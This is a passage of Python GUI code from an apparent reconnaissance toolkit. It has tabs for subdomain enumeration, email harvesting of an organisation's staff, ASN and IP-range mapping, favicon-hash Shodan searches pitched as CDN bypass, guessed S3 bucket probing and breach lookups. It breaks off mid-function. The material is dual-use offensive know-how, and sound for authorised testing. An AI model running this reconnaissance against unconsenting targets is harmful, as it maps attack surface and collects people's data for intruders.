        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "PASSIVE SUBDOMAIN INTELLIGENCE", "🔍").pack(fill='x', pady=(0,10))
        info = mk_card(pad); info.pack(fill='x', pady=(0,10))
        tk.Label(info, text="  Sources: crt.sh  •  HackerTarget  •  AlienVault OTX  •  URLScan.io",
                 bg=BG3, fg=FG2, font=MONO_S).pack(anchor='w', padx=10, pady=8)
        tr = mk_frame(pad, bg=BG2); tr.pack(fill='x', pady=(0,8))
        tk.Label(tr, text="Domain:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._osint_sub_target = tk.StringVar(value=self._osint_target())
        mk_entry(tr, var=self._osint_sub_target, w=38).pack(side='left', padx=8, ipady=3)
        mk_btn(tr, "← Project", lambda: self._osint_sub_target.set(self.project.get()), FG3, small=True).pack(side='left')
        mk_btn(tr, "🔍 Run All Sources", self._osint_run_subs, ACCENT).pack(side='right', padx=4, ipady=4)
        # Results
        self._osint_sub_stats = tk.Label(pad, text="", bg=BG2, fg=FG3, font=MONO_S)
        self._osint_sub_stats.pack(anchor='w', pady=(0,6))
        cols = ("Subdomain","Sources")
        self._osint_sub_tree = mk_tree(pad, columns=cols, show='headings', height=22)
        self._osint_sub_tree.heading("Subdomain", text="Subdomain"); self._osint_sub_tree.column("Subdomain", width=400)
        self._osint_sub_tree.heading("Sources", text="Sources"); self._osint_sub_tree.column("Sources", width=300)
        vsb = ttk.Scrollbar(pad, orient='vertical', command=self._osint_sub_tree.yview)
        self._osint_sub_tree.configure(yscrollcommand=vsb.set)
        tf = mk_frame(pad, bg=BG2); tf.pack(fill='both', expand=True)
        self._osint_sub_tree.pack(side='left', fill='both', expand=True, in_=tf)
        vsb.pack(side='right', fill='y', in_=tf)
        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x', pady=(6,0))
        def copy_subs():
            items = [self._osint_sub_tree.item(i)['values'][0] for i in self._osint_sub_tree.get_children()]
            self.root.clipboard_clear(); self.root.clipboard_append("\n".join(str(x) for x in items))
            self.set_status(f"Copied {len(items)} subdomains!", GREEN)
        def save_subs():
            items = [self._osint_sub_tree.item(i)['values'][0] for i in self._osint_sub_tree.get_children()]
            self._save_text("\n".join(str(x) for x in items))
        mk_btn(bf, "📋 Copy All", copy_subs, ACCENT, small=True).pack(side='left', padx=4)
        mk_btn(bf, "💾 Save", save_subs, GREEN, small=True).pack(side='left', padx=4)

    def _osint_run_subs(self):
        domain = self._osint_sub_target.get().strip()
        if not domain: return
        self._osint_sub_stats.config(text="⏳ Running all sources...", fg=CYAN)
        self._osint_sub_tree.delete(*self._osint_sub_tree.get_children())
        def _go():
            r = osint_engine.passive_all_sources(domain)
            def _update():
                self._osint_sub_tree.delete(*self._osint_sub_tree.get_children())
                per      = r.get("per_source", {})
                all_subs = r.get("all_unique", [])

                for sub in all_subs:
                    sources = [src for src, lst in per.items() if sub in lst]
                    self._osint_sub_tree.insert('', "end", values=(sub, ", ".join(sources)))

                # ── Save to project logs dir ──────────────────────────
                proj     = self.project.get() or domain
                proj_dir = LOGS_DIR / proj
                proj_dir.mkdir(parents=True, exist_ok=True)

                # Save plain subdomains list
                subs_file = proj_dir / "subdomains_all.txt"
                try:
                    with open(subs_file, 'w') as f:
                        f.write('\n'.join(all_subs))
                except Exception:
                    pass

                # Save per-source breakdown as JSON
                import json as _json
                detail_file = proj_dir / "osint_subdomain_intel.json"
                try:
                    with open(detail_file, 'w') as f:
                        _json.dump({
                            "domain": domain,
                            "total": len(all_subs),
                            "per_source": per,
                            "all_unique": all_subs,
                        }, f, indent=2)
                except Exception:
                    pass

                self._osint_sub_stats.config(
                    text=(f"✅ Found: {len(all_subs)} unique subdomains  |  "
                          f"crt.sh: {len(per.get('crtsh',[]))}  "
                          f"HackerTarget: {len(per.get('hackertarget',[]))}  "
                          f"AlienVault: {len(per.get('alienvault',[]))}  "
                          f"URLScan: {len(per.get('urlscan',[])) }  "
                          f"→ Saved: {subs_file.name}"),
                    fg=GREEN if all_subs else RED)
                self.set_status(
                    f"OSINT: {len(all_subs)} subdomains → {subs_file}",
                    GREEN if all_subs else RED)
            self.root.after(0, _update)
        threading.Thread(target=_go, daemon=True).start()

    def _build_osint_email(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "EMAIL HARVESTING — Hunter.io", "📧").pack(fill='x', pady=(0,10))
        tr = mk_frame(pad, bg=BG2); tr.pack(fill='x', pady=(0,8))
        tk.Label(tr, text="Domain:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._osint_email_target = tk.StringVar(value=self._osint_target())
        mk_entry(tr, var=self._osint_email_target, w=36).pack(side='left', padx=8, ipady=3)
        tk.Label(tr, text="Hunter.io Key:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left', padx=(12,4))
        self._hunter_key = tk.StringVar(value=load_cfg().get("api_keys",{}).get("hunter_api_key",""))
        mk_entry(tr, var=self._hunter_key, w=26, show="●").pack(side='left', ipady=3)
        mk_btn(tr, "🔍 Harvest Emails", self._osint_harvest_emails, ACCENT).pack(side='right', padx=4, ipady=4)
        self._email_stats = tk.Label(pad, text="Get free API key at hunter.io (25 requests/month free)", bg=BG2, fg=FG3, font=MONO_S)
        self._email_stats.pack(anchor='w', pady=(0,6))
        cols = ("Email","Name","Position","Type","Confidence")
        self._email_tree = mk_tree(pad, columns=cols, show='headings', height=18)
        wsz = {"Email":250,"Name":160,"Position":180,"Type":80,"Confidence":80}
        for c in cols: self._email_tree.heading(c,text=c); self._email_tree.column(c, width=wsz.get(c,100))
        vsb = ttk.Scrollbar(pad, orient='vertical', command=self._email_tree.yview)
        self._email_tree.configure(yscrollcommand=vsb.set)
        tf = mk_frame(pad, bg=BG2); tf.pack(fill='both', expand=True)
        self._email_tree.pack(side='left', fill='both', expand=True, in_=tf); vsb.pack(side='right', fill='y', in_=tf)
        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x', pady=(6,0))
        def copy_emails():
            items = [self._email_tree.item(i)['values'][0] for i in self._email_tree.get_children()]
            self.root.clipboard_clear(); self.root.clipboard_append("\n".join(str(x) for x in items))
            self.set_status(f"Copied {len(items)} emails!", GREEN)
        mk_btn(bf, "📋 Copy Emails", copy_emails, ACCENT, small=True).pack(side='left', padx=4)
        mk_btn(bf, "💾 Save Key", lambda: (
            load_cfg().__setitem__("api_keys", {**load_cfg().get("api_keys",{}), "hunter_api_key": self._hunter_key.get()}),
            save_cfg(load_cfg()),
            self.set_status("Hunter key saved!", GREEN)
        ), FG2, small=True).pack(side='left', padx=4)
        mk_btn(bf, "🌐 Get Free API Key", lambda: webbrowser.open("https://hunter.io/api-keys"), CYAN, small=True).pack(side='left', padx=4)

    def _osint_harvest_emails(self):
        domain = self._osint_email_target.get().strip()
        key    = self._hunter_key.get().strip()
        if not domain: return
        self._email_stats.config(text="⏳ Harvesting emails...", fg=CYAN)
        self._email_tree.delete(*self._email_tree.get_children())
        def _go():
            r = osint_engine.hunter_email_search(domain, key)
            def _update():
                if "error" in r and not r.get("emails"):
                    self._email_stats.config(text=f"⚠ Error: {r['error']}", fg=RED)
                    return
                emails = r.get("emails", [])
                for e in emails:
                    self._email_tree.insert('', "end", values=(
                        e.get("email",""), e.get("name",""), e.get("position",""),
                        e.get("type",""), f"{e.get('confidence',0)}%"))

                # Save to project logs
                proj     = self.project.get() or domain
                proj_dir = LOGS_DIR / proj
                proj_dir.mkdir(parents=True, exist_ok=True)
                emails_file = proj_dir / "emails.txt"
                try:
                    with open(emails_file, 'w') as f:
                        f.write('\n'.join(e.get("email","") for e in emails if e.get("email")))
                except Exception:
                    pass

                pattern = r.get("pattern","")
                total   = r.get("total", 0)
                self._email_stats.config(
                    text=(f"✅ {len(emails)} emails  |  Total: {total}  |  "
                          f"Pattern: {pattern}  |  Saved: {emails_file.name}"),
                    fg=GREEN if emails else YELLOW)
                self.set_status(f"Emails: {len(emails)} → {emails_file}", GREEN)
            self.root.after(0, _update)
        threading.Thread(target=_go, daemon=True).start()

    def _build_osint_asn(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "ASN / IP RANGE INTELLIGENCE", "🏢").pack(fill='x', pady=(0,10))
        tr = mk_frame(pad, bg=BG2); tr.pack(fill='x', pady=(0,8))
        tk.Label(tr, text="Domain/IP:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._osint_asn_target = tk.StringVar(value=self._osint_target())
        mk_entry(tr, var=self._osint_asn_target, w=36).pack(side='left', padx=8, ipady=3)
        mk_btn(tr, "🔍 Lookup ASN", self._osint_run_asn, ACCENT, small=True).pack(side='left', padx=4)
        mk_btn(tr, "📋 Get All IP Ranges", self._osint_get_ranges, CYAN, small=True).pack(side='left', padx=4)
        self._asn_txt = mk_stext(pad, h=28, bg=BG3, fg=FG)
        self._asn_txt.pack(fill='both', expand=True, pady=(8,0))
        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x', pady=(6,0))
        def copy_asn():
            self.root.clipboard_clear(); self.root.clipboard_append(self._asn_txt.get('1.0','end'))
            self.set_status("ASN data copied!", GREEN)
        mk_btn(bf, "📋 Copy", copy_asn, ACCENT, small=True).pack(side='left', padx=4)
        mk_btn(bf, "💾 Save", lambda: self._save_text(self._asn_txt.get('1.0','end')), GREEN, small=True).pack(side='left', padx=4)

    def _osint_run_asn(self):
        target = self._osint_asn_target.get().strip()
        if not target: return
        self._asn_txt.config(state='normal')
        self._asn_txt.delete('1.0','end')
        self._asn_txt.insert('end', f"[*] Looking up ASN for: {target}\n")
        self._asn_txt.config(state='disabled')
        def _go():
            r = osint_engine.asn_lookup(target)
            def _update():
                self._asn_txt.config(state='normal')
                if "error" in r:
                    self._asn_txt.insert('end', f"[!] Error: {r['error']}\n")
                    self._asn_txt.config(state='disabled'); return
                lines = [
                    f"IP:       {r.get('ip','')}",
                    f"Hostname: {r.get('hostname','')}",
                    f"Org/ASN:  {r.get('org','')}",
                    f"Country:  {r.get('country','')}",
                    f"Region:   {r.get('region','')}, {r.get('city','')}",
                ]
                for line in lines:
                    self._asn_txt.insert('end', line + '\n')

                # Save to project logs
                proj     = self.project.get() or target.split('.')[0]
                proj_dir = LOGS_DIR / proj
                proj_dir.mkdir(parents=True, exist_ok=True)
                asn_file = proj_dir / "asn_intel.txt"
                try:
                    with open(asn_file, 'w') as f:
                        f.write('\n'.join(lines))
                    self._asn_txt.insert('end', f"\n[✓] Saved: {asn_file}\n")
                except Exception:
                    pass

                asn = r.get('asn','')
                if asn:
                    self._asn_txt.insert('end', f"\n[*] Getting IP ranges for {asn}...\n")
                    self._asn_txt.config(state='disabled')
                    self._osint_get_ranges_for_asn(asn)
                else:
                    self._asn_txt.config(state='disabled')
                self.set_status(f"ASN: {r.get('org','')} → {asn_file.name}", GREEN)
            self.root.after(0, _update)
        threading.Thread(target=_go, daemon=True).start()

    def _osint_get_ranges_for_asn(self, asn):
        def _go():
            r = osint_engine.bgp_lookup(asn)
            proj     = self.project.get() or asn
            proj_dir = LOGS_DIR / proj
            proj_dir.mkdir(parents=True, exist_ok=True)

            def _update():
                self._asn_txt.config(state='normal')
                ipv4 = r.get("ipv4_ranges", [])
                ipv6 = r.get("ipv6_ranges", [])
                self._asn_txt.insert('end', f"\n=== IP RANGES for {asn} ===\n")
                self._asn_txt.insert('end', f"IPv4 ranges: {len(ipv4)}  |  IPv6 ranges: {len(ipv6)}\n\n")

                # Show all IPv4 ranges
                for cidr in ipv4[:100]:
                    self._asn_txt.insert('end', f"  {cidr}\n")
                if len(ipv4) > 100:
                    self._asn_txt.insert('end', f"  ... and {len(ipv4)-100} more\n")

                # Save ranges to file
                ranges_file = proj_dir / "ip_ranges.txt"
                try:
                    with open(ranges_file, 'w') as f2:
                        f2.write('\n'.join(ipv4 + ipv6))
                    self._asn_txt.insert('end', f"\n[✓] Ranges saved: {ranges_file}\n")
                except Exception:
                    pass

                # Reverse DNS on sample IPs from first few ranges
                self._asn_txt.insert('end', f"\n=== REVERSE DNS (sample IPs) ===\n")
                self._asn_txt.config(state='disabled')

                def _rdns():
                    import socket as _sock, ipaddress as _ip
                    rdns_results = []
                    for cidr in ipv4[:5]:  # sample first 5 ranges
                        try:
                            net = _ip.IPv4Network(cidr, strict=False)
                            # Sample first 10 hosts in each range
                            for host in list(net.hosts())[:10]:
                                ip_str = str(host)
                                try:
                                    hostname = _sock.gethostbyaddr(ip_str)[0]
                                    rdns_results.append(f"  {ip_str:15s} → {hostname}")
                                except Exception:
                                    pass
                        except Exception:
                            pass
                    # Save rdns
                    rdns_file = proj_dir / "asn_reverse_dns.txt"
                    try:
                        with open(rdns_file, 'w') as f2:
                            f2.write('\n'.join(rdns_results))
                    except Exception:
                        pass

                    def _rdns_update():
                        self._asn_txt.config(state='normal')
                        if rdns_results:
                            for line in rdns_results[:30]:
                                self._asn_txt.insert('end', line + '\n')
                            if len(rdns_results) > 30:
                                self._asn_txt.insert('end', f"  ... {len(rdns_results)-30} more in {rdns_file.name}\n")
                        else:
                            self._asn_txt.insert('end', "  No reverse DNS found for sampled IPs\n")
                        self._asn_txt.insert('end', f"\n[✓] Full data saved to:\n")
                        self._asn_txt.insert('end', f"    {ranges_file}\n")
                        self._asn_txt.insert('end', f"    {rdns_file}\n")
                        self._asn_txt.insert('end', f"\n[*] To scan all IPs: nmap -sn -iL {ranges_file}\n")
                        self._asn_txt.config(state='disabled')
                        self.set_status(f"ASN: {len(ipv4)} IPv4 ranges, {len(rdns_results)} rDNS → saved", GREEN)
                    self.root.after(0, _rdns_update)

                threading.Thread(target=_rdns, daemon=True).start()
            self.root.after(0, _update)
        threading.Thread(target=_go, daemon=True).start()

    def _osint_get_ranges(self):
        self._osint_run_asn()

    def _build_osint_favicon(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "FAVICON HASH — Find Hidden Infra via Shodan", "🔑").pack(fill='x', pady=(0,10))
        info = mk_card(pad); info.pack(fill='x', pady=(0,10))
        tk.Label(info, text="  Compute favicon MurmurHash3 → search Shodan to find all servers using this favicon\n"
                 "  Often reveals hidden IPs, CDN origins, development servers, staging environments",
                 bg=BG3, fg=FG2, font=MONO_S).pack(anchor='w', padx=10, pady=8)
        tr = mk_frame(pad, bg=BG2); tr.pack(fill='x', pady=(0,8))
        tk.Label(tr, text="URL:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._fav_url_var = tk.StringVar(value=f"https://{self._osint_target()}")
        mk_entry(tr, var=self._fav_url_var, w=46).pack(side='left', padx=8, ipady=3)
        mk_btn(tr, "🔍 Compute & Search", self._osint_favicon_hash, ACCENT, small=True).pack(side='left', padx=4)
        self._fav_result = mk_stext(pad, h=12, bg=BG3, fg=FG)
        self._fav_result.pack(fill='x', pady=(8,8))
        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x')
        self._fav_shodan_btn = mk_btn(bf, "🌐 Open Shodan Search", lambda: None, RED, small=True)
        self._fav_shodan_btn.pack(side='left', padx=4)
        self._fav_hash_var = tk.StringVar()

    def _osint_favicon_hash(self):
        raw = self._fav_url_var.get().strip()
        if not raw: return
        if not raw.startswith('http'): raw = 'https://' + raw
        raw = raw.rstrip('/')
        import urllib.parse as _up, socket as _sock
        domain = _up.urlparse(raw).netloc or raw.replace('https://','').replace('http://','').split('/')[0]
        base_url = f"https://{domain}"

        self._fav_result.config(state='normal')
        self._fav_result.delete('1.0', 'end')
        self._fav_result.insert('end', f"[*] Full Favicon Recon: {domain}\n\n")
        self._fav_result.config(state='disabled')

        def _go():
            lines = []
            # ── Resolve IP ────────────────────────────────────────
            try:
                ip = _sock.gethostbyname(domain)
            except Exception:
                ip = "unresolved"

            # ── Try multiple favicon paths ────────────────────────
            FAV_PATHS = [
                '/favicon.ico', '/favicon.png', '/favicon-32x32.png',
                '/favicon-16x16.png', '/apple-touch-icon.png',
                '/apple-touch-icon-precomposed.png',
                '/images/favicon.ico', '/img/favicon.ico',
                '/static/favicon.ico', '/assets/favicon.ico',
                '/public/favicon.ico',
            ]
            best_result = None
            for path in FAV_PATHS:
                url = base_url + path
                r = osint_engine.get_favicon_hash(url)
                if 'hash' in r and not r.get('error'):
                    best_result = r
                    best_result['path'] = path
                    break

            lines.append(f"=== TARGET ===")
            lines.append(f"Domain:       {domain}")
            lines.append(f"Resolved IP:  {ip}")
            lines.append(f"Base URL:     {base_url}")

            if best_result:
                h = best_result['hash']
                lines.append(f"\n=== FAVICON FOUND ===")
                lines.append(f"Path:         {best_result.get('path','')}")
                lines.append(f"URL:          {best_result.get('url','')}")
                lines.append(f"Size:         {best_result.get('size_bytes',0)} bytes")
                lines.append(f"MurmurHash3:  {h}")
                lines.append(f"\n=== SHODAN SEARCH ===")
                lines.append(f"Query:        http.favicon.hash:{h}")
                lines.append(f"URL:          {best_result.get('shodan_url','')}")
                lines.append(f"\n=== CLI COMMANDS ===")
                lines.append(f"shodan search 'http.favicon.hash:{h}' --fields ip_str,port,hostnames,org,country_code")
                lines.append(f"shodan count 'http.favicon.hash:{h}'")
                lines.append(f"\n=== CENSYS SEARCH ===")
                lines.append(f"services.http.response.favicons.md5_hash:<md5_of_favicon>")
                lines.append(f"(Upload favicon to https://search.censys.io/search?resource=hosts)")
                lines.append(f"\n=== WHAT THIS REVEALS ===")
                lines.append(f"→ All servers worldwide using same favicon as {domain}")
                lines.append(f"→ CDN/Cloudflare bypass: look for non-CDN IP with same favicon")
                lines.append(f"→ Staging / dev / internal servers using same branding")

                # Try Shodan API if key available
                shodan_key = load_cfg().get("api_keys",{}).get("shodan","")
                if shodan_key:
                    try:
                        import urllib.request as _ur
                        shodan_url = f"https://api.shodan.io/shodan/host/search?key={shodan_key}&query=http.favicon.hash:{h}&minify=true"
                        req = _ur.Request(shodan_url, headers={"User-Agent":"Mozilla/5.0"})
                        with _ur.urlopen(req, timeout=15) as resp:
                            import json as _json
                            data = _json.loads(resp.read())
                        hits = data.get('matches', [])
                        lines.append(f"\n=== SHODAN RESULTS ({data.get('total',0)} total, showing {len(hits)}) ===")
                        found_ips = []
                        for hit in hits[:20]:
                            hit_ip = hit.get('ip_str','')
                            hit_port = hit.get('port','')
                            hit_host = ', '.join(hit.get('hostnames',[])) or hit_ip
                            hit_org  = hit.get('org','')
                            found_ips.append(hit_ip)
                            if hit_ip != ip:
                                lines.append(f"  🔴 DIFFERENT IP: {hit_ip}:{hit_port}  [{hit_host}]  {hit_org}")
                            else:
                                lines.append(f"  ✅ {hit_ip}:{hit_port}  [{hit_host}]  {hit_org}")
                        if found_ips and ip not in found_ips:
                            lines.append(f"\n  ⚠ Current IP {ip} NOT in Shodan results")
                            lines.append(f"  ⚠ Real server may be at one of the IPs above!")
                    except Exception as e:
                        lines.append(f"\n[!] Shodan API: {e}")
                else:
                    lines.append(f"\n[*] Add Shodan API key in Settings for automatic IP lookup")
                    lines.append(f"[*] Free at: https://account.shodan.io/")
            else:
                lines.append(f"\n[!] No favicon found at standard paths")
                lines.append(f"    Tried: {', '.join(FAV_PATHS[:5])}...")
                lines.append(f"\n[*] Try manually:")
                lines.append(f"    curl -sI {base_url}/favicon.ico")
                lines.append(f"    Check page source: view-source:{base_url}")

            # ── Save to project logs ──────────────────────────────
            proj     = self.project.get() or domain
            proj_dir = LOGS_DIR / proj
            proj_dir.mkdir(parents=True, exist_ok=True)
            out_file = proj_dir / "favicon_recon.txt"
            try:
                with open(out_file, 'w') as f2:
                    f2.write('\n'.join(lines))
            except Exception: pass

            content = '\n'.join(lines)
            def _update():
                self._fav_result.config(state='normal')
                self._fav_result.delete('1.0', 'end')
                self._fav_result.insert('end', content)
                self._fav_result.config(state='disabled')
                if best_result:
                    surl = best_result.get('shodan_url','')
                    self._fav_shodan_btn.config(command=lambda u=surl: webbrowser.open(u))
                self.set_status(
                    f"Favicon: hash={best_result.get('hash','N/A') if best_result else 'not found'} | IP={ip} → {out_file.name}",
                    GREEN if best_result else YELLOW)
            self.root.after(0, _update)
        threading.Thread(target=_go, daemon=True).start()

    def _build_osint_cloud(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "CLOUD ASSET DISCOVERY", "☁️").pack(fill='x', pady=(0,10))
        tr = mk_frame(pad, bg=BG2); tr.pack(fill='x', pady=(0,8))
        tk.Label(tr, text="Domain:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._cloud_target = tk.StringVar(value=self._osint_target())
        mk_entry(tr, var=self._cloud_target, w=36).pack(side='left', padx=8, ipady=3)
        mk_btn(tr, "🔍 Discover Assets", self._osint_cloud_discover, ACCENT, small=True).pack(side='left', padx=4)
        mk_btn(tr, "✅ Check S3 Access", self._osint_check_s3, RED, small=True).pack(side='left', padx=4)
        self._cloud_txt = mk_stext(pad, h=30, bg=BG3, fg=FG)
        self._cloud_txt.pack(fill='both', expand=True, pady=(8,0))
        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x', pady=(6,0))
        mk_btn(bf, "📋 Copy", lambda: (self.root.clipboard_clear(), self.root.clipboard_append(self._cloud_txt.get('1.0','end'))), ACCENT, small=True).pack(side='left', padx=4)

    def _osint_cloud_discover(self):
        domain = self._cloud_target.get().strip()
        if not domain: return
        self._cloud_txt.config(state='normal'); self._cloud_txt.delete('1.0','end')
        assets = osint_engine.discover_cloud_assets(domain)
        self._cloud_txt.insert('end', f"Cloud Asset Discovery for: {domain}\n")
        self._cloud_txt.insert('end', "="*60 + "\n\n")
        for cat, items in assets.items():
            if cat == "check_commands": continue
            self._cloud_txt.insert('end', f"[{cat.upper()}]\n")
            for item in items[:8]: self._cloud_txt.insert('end', f"  {item}\n")
            self._cloud_txt.insert('end', "\n")
        self._cloud_txt.insert('end', "[CHECK COMMANDS]\n")
        for cmd in assets.get("check_commands",[]): self._cloud_txt.insert('end', f"  {cmd}\n")
        self._cloud_txt.config(state='disabled')
        self.set_status(f"Cloud assets generated for {domain}", GREEN)

    def _osint_check_s3(self):
        domain = self._cloud_target.get().strip()
        if not domain: return
        company = domain.split('.')[0]
        buckets = [company, domain.replace('.','-'), company+'-backup', company+'-dev', company+'-data']
        self._cloud_txt.config(state='normal'); self._cloud_txt.delete('1.0','end')
        self._cloud_txt.insert('end', f"[*] Checking {len(buckets)} S3 buckets...\n\n")
        self._cloud_txt.config(state='disabled')
        def _go():
            for b in buckets:
                r = osint_engine.check_s3_bucket(b)
                def _upd(res=r, bn=b):
                    self._cloud_txt.config(state='normal')
                    status = res.get('status','')
                    sev    = res.get('severity','NONE')
                    if sev == 'CRITICAL':
                        self._cloud_txt.insert('end', f"[!!!] CRITICAL: s3://{bn} → {status}  Objects: {res.get('objects_shown',0)}\n")
                    elif status == 'EXISTS_PRIVATE':
                        self._cloud_txt.insert('end', f"[+] EXISTS: s3://{bn} → Private (403 Forbidden)\n")
                    elif status != 'NOT_FOUND':
                        self._cloud_txt.insert('end', f"[?] s3://{bn} → {status}\n")
                    self._cloud_txt.config(state='disabled')
                self.root.after(0, _upd)
                import time; time.sleep(0.5)
        threading.Thread(target=_go, daemon=True).start()

    def _build_osint_leaks(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "LEAK & BREACH FINDER", "💧").pack(fill='x', pady=(0,10))
        tr = mk_frame(pad, bg=BG2); tr.pack(fill='x', pady=(0,8))
        tk.Label(tr, text="Domain:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._leaks_target = tk.StringVar(value=self._osint_target())
        mk_entry(tr, var=self._leaks_target, w=36).pack(side='left', padx=8, ipady=3)
        mk_btn(tr, "🔍 Find Leaks", self._osint_find_leaks, ACCENT, small=True).pack(side='left', padx=4)
        mk_btn(tr, "🔒 Check HIBP", self._osint_check_hibp, RED, small=True).pack(side='left', padx=4)
        self._leaks_txt = mk_stext(pad, h=28, bg=BG3, fg=FG)
        self._leaks_txt.pack(fill='both', expand=True, pady=(8,0))

    def _osint_find_leaks(self):
        domain = self._leaks_target.get().strip()
        if not domain: return
        links = osint_engine.search_leaks_online(domain)
        self._leaks_txt.config(state='normal'); self._leaks_txt.delete('1.0','end')
        self._leaks_txt.insert('end', f"Leak Search URLs for: {domain}\n" + "="*60 + "\n\n")
        for name, url in links.items():
            self._leaks_txt.insert('end', f"[{name}]\n  {url}\n\n")
        self._leaks_txt.insert('end', "\n[*] Right-click any URL and open in browser\n")
        self._leaks_txt.config(state='disabled')
        # Open top 3 in browser
        for name, url in list(links.items())[:3]: webbrowser.open(url)
        self.set_status(f"Opened top 3 leak search URLs", GREEN)

    def _osint_check_hibp(self):
        domain = self._leaks_target.get().strip()
        if not domain: return
        self._leaks_txt.config(state='normal'); self._leaks_txt.delete('1.0','end')
        self._leaks_txt.insert('end', f"[*] Checking HaveIBeenPwned for: {domain}\n"); self._leaks_txt.config(state='disabled')
        def _go():
            r = osint_engine.check_hibp_domain(domain)
            def _update():
                self._leaks_txt.config(state='normal')
                n = r.get("breaches",0)
                if n > 0:
                    self._leaks_txt.insert('end', f"[!!!] {n} breach(es) found!\n\n")
                    for b in r.get("details",[]):
                        self._leaks_txt.insert('end', f"  Breach: {b.get('name','')}\n")
                        self._leaks_txt.insert('end', f"  Date:   {b.get('date','')}\n")
                        self._leaks_txt.insert('end', f"  Count:  {b.get('accounts',0):,} accounts\n")
                        self._leaks_txt.insert('end', f"  Data:   {', '.join(b.get('data_classes',[])[:5])}\n\n")
                else:
                    if "error" in r:
                        self._leaks_txt.insert('end', f"[!] {r['error']}\n")
                    else:
                        self._leaks_txt.insert('end', "[OK] No breaches found in HIBP database\n")
                self._leaks_txt.config(state='disabled')
                self.set_status(f"HIBP: {n} breaches for {domain}", RED if n > 0 else GREEN)
            self.root.after(0, _update)
        threading.Thread(target=_go, daemon=True).start()

    # ════════════════════════════════════════════════════════════════
    #  TIER 1 — HTTP REQUEST REPLAYER
    # ════════════════════════════════════════════════════════════════
    def _build_http_replayer(self, frame):
        frame.configure(bg=BG2)
        paned = tk.PanedWindow(frame, orient='horizontal', bg=BG, sashwidth=5)
        paned.pack(fill='both', expand=True)

        # Left: Request editor
        left = mk_frame(paned, bg=BG2); paned.add(left, width=520)
        tk.Label(left, text="REQUEST EDITOR", bg=BG2, fg=ACCENT, font=MONO_B).pack(pady=(10,4), padx=12, anchor='w')

        # Template selector
        tmpl_f = mk_frame(left, bg=BG2); tmpl_f.pack(fill='x', padx=12, pady=(0,6))
        tk.Label(tmpl_f, text="Template:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        tmpl_var = tk.StringVar(value="Basic GET")
        tmpl_cb  = ttk.Combobox(tmpl_f, textvariable=tmpl_var, values=list(http_replayer.REQUEST_TEMPLATES.keys()), width=22, font=MONO_S)
        tmpl_cb.pack(side='left', padx=8)
        mk_btn(tmpl_f, "Load", lambda: self._http_load_template(tmpl_var.get(), self._http_req_txt), FG2, small=True).pack(side='left', padx=4)

        # Request textbox
        self._http_req_txt = mk_stext(left, h=22, bg=BG3, fg=CYAN)
        self._http_req_txt.pack(fill='x', padx=12, pady=(0,6))
        self._http_req_txt.insert('end', "GET / HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n")

        # Options row
        opt_f = mk_frame(left, bg=BG2); opt_f.pack(fill='x', padx=12, pady=(0,6))
        tk.Label(opt_f, text="Proxy:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._http_proxy_var = tk.StringVar(value="")
        mk_entry(opt_f, var=self._http_proxy_var, w=18).pack(side='left', padx=6, ipady=2)
        tk.Label(opt_f, text="e.g. 127.0.0.1:8080", bg=BG2, fg=FG3, font=(_MONO_FACE,8)).pack(side='left')
        self._http_follow_redir = tk.BooleanVar(value=True)
        ttk.Checkbutton(opt_f, text="Follow Redirects", variable=self._http_follow_redir).pack(side='right')

        # Send button
        bf = mk_frame(left, bg=BG2); bf.pack(fill='x', padx=12, pady=(0,10))
        mk_btn(bf, "▶ SEND REQUEST", self._http_send, ACCENT).pack(side='left', ipady=6, padx=(0,8))
        mk_btn(bf, "⬛ Clear", lambda: self._http_req_txt.delete('1.0','end'), FG3, small=True).pack(side='left', padx=4)
        mk_btn(bf, "📋 Copy", lambda: (self.root.clipboard_clear(), self.root.clipboard_append(self._http_req_txt.get('1.0','end'))), FG2, small=True).pack(side='left', padx=4)
        self._http_history_btn_var = tk.StringVar(value="History: 0")
        tk.Label(bf, textvariable=self._http_history_btn_var, bg=BG2, fg=FG3, font=MONO_S).pack(side='right')

        # Right: Response
        right = mk_frame(paned, bg=BG2); paned.add(right, stretch='always')
        tk.Label(right, text="RESPONSE", bg=BG2, fg=ACCENT, font=MONO_B).pack(pady=(10,4), padx=12, anchor='w')

        # Status bar
        self._http_status_lbl = tk.Label(right, text="No response yet", bg=BG3, fg=FG3, font=MONO_S)
        self._http_status_lbl.pack(fill='x', padx=12, pady=(0,6), ipady=4)

        # Response tabs
        resp_nb = ttk.Notebook(right); resp_nb.pack(fill='both', expand=True, padx=12, pady=(0,6))
        raw_f    = tk.Frame(resp_nb, bg=BG2); resp_nb.add(raw_f, text="  Raw Response  ")
        headers_f = tk.Frame(resp_nb, bg=BG2); resp_nb.add(headers_f, text="  Headers  ")
        analysis_f = tk.Frame(resp_nb, bg=BG2); resp_nb.add(analysis_f, text="  Security Analysis  ")
        diff_f   = tk.Frame(resp_nb, bg=BG2); resp_nb.add(diff_f, text="  Diff  ")

        self._http_resp_txt    = mk_stext(raw_f, h=25, bg=BG3, fg=FG)
